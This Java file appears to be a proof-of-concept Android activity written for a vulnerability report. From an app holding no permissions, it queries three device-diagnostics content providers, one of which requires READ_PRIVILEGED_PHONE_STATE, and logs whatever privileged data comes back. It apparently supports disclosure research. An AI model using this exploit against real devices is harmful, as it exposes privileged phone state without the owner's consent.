package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class DeviceDiagPocActivity extends Activity {
    private static final String TAG = "DeviceDiagPoc";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("DeviceDiagnostics Provider PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n");
        logView.append("Package: " + getPackageName() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        log("=== TEST: GetStatusContentProvider ===");
        log("Provider requires: READ_PRIVILEGED_PHONE_STATE");
        log("Our app has: NONE of those permissions\n");

        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.devicediagnostics.GetStatusContentProvider"),
                null, null, null, null
            );
            if (c != null) {
                log("*** QUERY SUCCEEDED - NO PERMISSION CHECK! ***");
                log("Rows: " + c.getCount());
                log("Columns: " + c.getColumnCount());
                if (c.moveToFirst()) {
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        String colName = c.getColumnName(i);
                        String val = c.getString(i);
                        log("\nColumn: " + colName);
                        log("Value: " + val);
                    }
                }
                c.close();
            } else {
                log("Query returned null cursor");
            }
        } catch (SecurityException e) {
            log("BLOCKED by permission: " + e.getMessage());
        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("\n=== TEST: EvaluateContentProvider ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.devicediagnostics.EvaluateContentProvider"),
                null, null, null, null
            );
            if (c != null) {
                log("*** EVALUATE QUERY SUCCEEDED ***");
                log("Rows: " + c.getCount());
                c.close();
            } else {
                log("Query returned null cursor");
            }
        } catch (SecurityException e) {
            log("BLOCKED: " + e.getMessage());
        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("\n=== TEST: TradeInModeTestingContentProvider ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.devicediagnostics.TradeInModeTestingContentProvider"),
                null, null, null, null
            );
            if (c != null) {
                log("*** TRADEIN QUERY SUCCEEDED ***");
                log("Rows: " + c.getCount());
                c.close();
            } else {
                log("Query returned null cursor");
            }
        } catch (SecurityException e) {
            log("BLOCKED: " + e.getMessage());
        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }
}
